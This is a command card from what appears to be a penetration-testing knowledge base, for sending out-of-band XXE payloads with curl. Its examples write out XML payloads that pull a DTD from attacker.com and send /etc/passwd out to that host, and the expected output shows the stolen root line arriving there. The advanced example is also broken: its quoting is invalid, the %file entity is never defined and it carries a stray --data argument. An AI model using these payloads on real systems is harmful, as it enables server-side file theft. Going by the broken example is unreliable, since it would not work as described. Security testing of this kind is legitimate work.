---
id: 0c090a3b-b3f1-41c8-b4fa-954745b7af56
name: curl-send-out-of-band-xxe-payload
type: command
executor: bash
data: 'curl -X POST $_TARGET_URL -H "Content-Type: application/xml" -d $_PAYLOAD'
output: null
created_at: '2023-04-06T03:56:44.075523+00:00'
updated_at: '2023-04-10T20:24:39.937276+00:00'
platforms:
  - Linux
  - Web
tags:
  - xxe
  - oob
  - ssrf
verified: true
validated: true
---

# curl-send-out-of-band-xxe-payload

## Command

```bash
curl -X POST $_TARGET_URL -H "Content-Type: application/xml" -d $_PAYLOAD
```

## Description

This command sends an out-of-band (OOB) XXE payload to test for blind vulnerabilities where data is exfiltrated via external requests rather than reflected in the response. Requires hosting an external DTD on an attacker server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | The vulnerable XML endpoint | Yes |
| $_PAYLOAD | The full OOB XXE XML payload string, including external DTD reference | Yes |
| -X POST | HTTP POST method | Built-in |
| -H "Content-Type: application/xml" | XML content type | Built-in |
| -d | Payload data | Built-in |

## Examples

### Basic Usage

```bash
curl -X POST http://target.com/api -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo></foo>'
```

### Advanced Usage (with file exfil)

```bash
curl -X POST http://target.com/api -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;"> %eval; %exfil;"> ]><foo>&file;</foo>' --data "file:///etc/passwd"
```

## Expected Output

Response may be empty or error if blind, but check attacker server for incoming request with exfiltrated data:
```
GET /?data=root%3Ax%3A0%3A0%3Aroot%3A%2Froot%3A%2Fbin%2Fbash HTTP/1.1
Host: attacker.com
```

## Related

- [[procedures/Detect-and-Mitigate-XXE-Injection]]
- [[commands/curl-send-basic-xxe-payload]]
